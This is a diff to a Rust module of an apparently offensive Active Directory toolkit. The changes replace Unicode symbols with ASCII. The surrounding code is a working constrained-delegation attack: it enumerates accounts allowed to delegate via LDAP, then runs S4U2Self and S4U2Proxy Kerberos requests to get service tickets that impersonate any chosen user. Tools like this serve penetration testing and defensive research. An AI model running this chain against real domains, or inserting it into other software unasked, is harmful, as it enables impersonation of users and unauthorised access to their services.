@@ -1,12 +1,12 @@
-//! Constrained Delegation abuse — Enumerate accounts with
-//! msDS-AllowedToDelegateTo and perform S4U2Self → S4U2Proxy
+//! Constrained Delegation abuse -- Enumerate accounts with
+//! msDS-AllowedToDelegateTo and perform S4U2Self -> S4U2Proxy
 //! impersonation chains to access target services as any user.
 //!
 //! Typical attack flow:
 //! 1. LDAP enum: find accounts with TRUSTED_TO_AUTH_FOR_DELEGATION
 //! 2. Obtain TGT for the delegatable account
-//! 3. S4U2Self → get ticket impersonating target user
-//! 4. S4U2Proxy → get service ticket for the allowed SPN
+//! 3. S4U2Self -> get ticket impersonating target user
+//! 4. S4U2Proxy -> get service ticket for the allowed SPN
 
 use crate::runner::HuntConfig;
 use colored::Colorize;
@@ -17,18 +17,18 @@ use overthrone_core::proto::ldap;
 use serde::{Deserialize, Serialize};
 use tracing::{info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // UAC constants for delegation
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
-/// TRUSTED_TO_AUTH_FOR_DELEGATION — allows S4U2Self without user interaction
+/// TRUSTED_TO_AUTH_FOR_DELEGATION -- allows S4U2Self without user interaction
 const UAC_TRUSTED_TO_AUTH_FOR_DELEGATION: u32 = 0x01000000;
 /// Account is disabled
 const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Configuration
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 /// Structure
 #[derive(Debug, Clone)]
 pub struct ConstrainedConfig {
@@ -56,9 +56,9 @@ impl Default for ConstrainedConfig {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Result
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 /// Structure
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ConstrainedResult {
@@ -100,9 +100,9 @@ pub struct S4UChainResult {
     pub error: Option<String>,
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // LDAP Enumeration
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Enumerate accounts with constrained delegation configured
 async fn enumerate_constrained(config: &HuntConfig) -> Result<Vec<DelegatableAccount>> {
@@ -166,11 +166,11 @@ async fn enumerate_constrained(config: &HuntConfig) -> Result<Vec<DelegatableAcc
     Ok(accounts)
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // S4U Chain Execution
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
-/// Perform the full S4U2Self → S4U2Proxy chain for one delegation path
+/// Perform the full S4U2Self -> S4U2Proxy chain for one delegation path
 async fn execute_s4u_chain(
     config: &HuntConfig,
     tgt: &TicketGrantingData,
@@ -178,11 +178,11 @@ async fn execute_s4u_chain(
     target_spn: &str,
 ) -> S4UChainResult {
     info!(
-        "S4U chain: {} → {} as {}",
+        "S4U chain: {} -> {} as {}",
         tgt.client_principal, target_spn, impersonate_user
     );
 
-    // Step 1: S4U2Self — get a ticket for ourselves impersonating the target user
+    // Step 1: S4U2Self -- get a ticket for ourselves impersonating the target user
     let s4u2self_ticket = match kerberos::s4u2self(&config.dc_ip, tgt, impersonate_user).await {
         Ok(t) => t,
         Err(e) => {
@@ -198,16 +198,16 @@ async fn execute_s4u_chain(
 
     info!(
         "  {} S4U2Self ticket for {} obtained",
-        "✓".green(),
+        "[+]".green(),
         impersonate_user
     );
 
-    // Step 2: S4U2Proxy — use the S4U2Self ticket to get a ticket for the target service
+    // Step 2: S4U2Proxy -- use the S4U2Self ticket to get a ticket for the target service
     match kerberos::s4u2proxy(&config.dc_ip, tgt, &s4u2self_ticket, target_spn).await {
         Ok(_service_ticket) => {
             info!(
                 "  {} S4U2Proxy ticket for {} as {} obtained",
-                "✓".green(),
+                "[+]".green(),
                 target_spn.bold(),
                 impersonate_user.bold()
             );
@@ -220,7 +220,7 @@ async fn execute_s4u_chain(
             }
         }
         Err(e) => {
-            warn!("  {} S4U2Proxy failed for {}: {}", "✗".red(), target_spn, e);
+            warn!("  {} S4U2Proxy failed for {}: {}", "[-]".red(), target_spn, e);
             S4UChainResult {
                 source_account: tgt.client_principal.clone(),
                 impersonated_user: impersonate_user.to_string(),
@@ -232,12 +232,12 @@ async fn execute_s4u_chain(
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Public Runner
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 pub async fn run(config: &HuntConfig, cc: &ConstrainedConfig) -> Result<ConstrainedResult> {
-    info!("{}", "═══ CONSTRAINED DELEGATION ═══".bold().blue());
+    info!("{}", "=== CONSTRAINED DELEGATION ===".bold().blue());
 
     // Step 1: Enumerate constrained delegation accounts
     let accounts = enumerate_constrained(config).await?;
@@ -251,8 +251,8 @@ pub async fn run(config: &HuntConfig, cc: &ConstrainedConfig) -> Result<Constrai
         };
 
         info!(
-            "  {} {} ({}) {} → {:?}",
-            "→".cyan(),
+            "  {} {} ({}) {} -> {:?}",
+            "->".cyan(),
             acct.sam_account_name.bold(),
             acct.account_type.dimmed(),
             t2a4d_label,
@@ -314,13 +314,13 @@ pub async fn run(config: &HuntConfig, cc: &ConstrainedConfig) -> Result<Constrai
     );
 
     for (acct, target_spn) in &targets {
-        pb.set_message(format!("{} → {}", acct.sam_account_name, target_spn));
+        pb.set_message(format!("{} -> {}", acct.sam_account_name, target_spn));
 
         // Only accounts with protocol transition can do S4U2Self without the user
         if !acct.protocol_transition {
             warn!(
-                "  {} {} has no protocol transition (T2A4D) — S4U2Self may fail",
-                "⚠".yellow(),
+                "  {} {} has no protocol transition (T2A4D) -- S4U2Self may fail",
+                "[!]".yellow(),
                 acct.sam_account_name
             );
         }
